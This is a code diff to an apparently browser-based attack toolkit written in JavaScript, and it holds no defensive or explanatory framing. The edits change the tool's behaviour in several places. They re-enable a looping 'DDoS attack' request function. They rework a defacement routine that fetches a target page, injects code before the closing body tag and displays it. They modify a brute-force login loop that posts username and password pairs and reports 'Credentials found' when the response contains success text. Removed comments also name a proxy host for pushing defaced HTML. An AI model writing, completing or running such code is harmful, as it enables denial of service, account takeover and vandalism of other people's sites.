@@ -135,36 +135,36 @@
  
 
    try {
-    // const response = await fetch(url, { mode: 'no-cors' });
-    // if (!response.ok) {
-    //  throw new Error(`HTTP error! status: ${response.status}`);
-    // }
-    // let html = await response.text();
+    // Fetch the target URL's content
+    const response = await fetch(url, {
+     mode: 'cors' // CORS mode enables cross-origin requests
+    });
  
 
-    // Inject defacement code
-    // html = html.replace('</body>', code + '</body>');
-    document.body.innerHTML = code;
+    if (!response.ok) {
+     throw new Error(`HTTP error! status: ${response.status}`);
+    }
  
 
-    // Send the modified HTML to a proxy server
-    // const proxyUrl = 'https://fuckcloudflare.tk/update';
-    // const proxyResponse = await fetch(proxyUrl, {
-    //  method: 'POST',
-    //  headers: {
-    //  'Content-Type': 'application/json'
-    //  },
-    //  body: JSON.stringify({ url: url, html: html })
-    // });
+    let html = await response.text();
  
 
-    // if (proxyResponse.ok) {
-    console.log("Site defaced successfully.");
-    alert("Site defaced successfully!");
-    // } else {
-    //  console.error("Deface failed (proxy):", proxyResponse.status);
-    //  alert("Deface failed (via proxy). Check console for details.");
-    // }
+    // Inject defacement code right before the closing </body> tag
+    html = html.replace('</body>', code + '</body>');
+ 
+
+    // Open a new window and display the modified HTML
+    let newWindow = window.open('', '_blank');
+    if (newWindow) {
+     newWindow.document.write(html);
+     newWindow.document.close(); // Important: Close the document stream
+    } else {
+     alert('Popup blocked! Please allow popups for this site to view the defaced site.');
+    }
+ 
+
+    console.log("Site defaced successfully in a new window.");
+    alert("Site defaced successfully in a new window!");
  
 
    } catch (error) {
@@ -270,17 +270,17 @@
  
 
      // Use fetch with AbortSignal
-     // const response = await fetch(url, {
-     //  mode: 'no-cors',
-     //  signal: signal,
-     // });
+     const response = await fetch(url, {
+      mode: 'no-cors',
+      signal: signal,
+     });
  
 
-     // if (response.ok) {
-     console.log("DDoS attack sent to:", url);
-     // } else {
-     //  console.error("DDoS attack failed (thread):", response.status);
-     // }
+     if (response.ok) {
+      console.log("DDoS attack sent to:", url);
+     } else {
+      console.error("DDoS attack failed (thread):", response.status);
+     }
     } catch (error) {
      if (error.name === 'AbortError') {
       console.log('DDoS attack thread aborted.');
@@ -415,7 +415,6 @@
    let result = '';
    for (let i = 0; i < text.length; i++) {
     const charCode = text.charCodeAt(i) ^ keyHash.charCodeAt(i % keyHash.length);
-    result += String.fromCharCode(charCode);
     result += String.fromCharCode(charCode);
    }
    return result;
@@ -652,14 +651,16 @@
    console.log("Testing TOR connection to:", url);
  
 
-   // const torProxy = 'socks5://127.0.0.1:9050'; // Default TOR proxy
- 
-
+   // Implement a simple check by trying to fetch the TOR URL
    try {
     const response = await fetch(url, {
      mode: 'cors',
-     // proxy: torProxy,
+     // Set up a proxy to use TOR (you might need a TOR proxy running locally)
+     // This is just an example. Actual implementation depends on your setup.
+     // Example: proxy: 'socks5://127.0.0.1:9050',
     });
+ 
+
     if (response.ok) {
      console.log("TOR connection successful!");
      alert("TOR connection successful!");
@@ -713,18 +714,29 @@
       formData.append('password', password);
  
 
+      // Use 'cors' mode to avoid the No 'Access-Control-Allow-Origin' header issue
       const response = await fetch(url, {
        method: 'POST',
        body: formData,
-       mode: 'no-cors'
+       mode: 'cors'
       });
  
 
-      if (response.status === 200) {
-       console.log("Success! Credentials found:", username, password);
-       statusDiv.innerText = `Success! Credentials found: ${username} : ${password}`;
-       alert(`Success! Credentials found: ${username} : ${password}`);
-       return;
+      // Check if the response status is OK
+      if (response.ok) {
+       // Parse the response body as text
+       const responseText = await response.text();
+ 
+
+       // Check if the response body contains specific success indicators
+       if (responseText.includes('Login successful') || responseText.includes('Welcome')) {
+        console.log("Success! Credentials found:", username, password);
+        statusDiv.innerText = `Success! Credentials found: ${username} : ${password}`;
+        alert(`Success! Credentials found: ${username} : ${password}`);
+        return;
+       } else {
+        console.log("Failed:", response.status);
+       }
       } else {
        console.log("Failed:", response.status);
       }
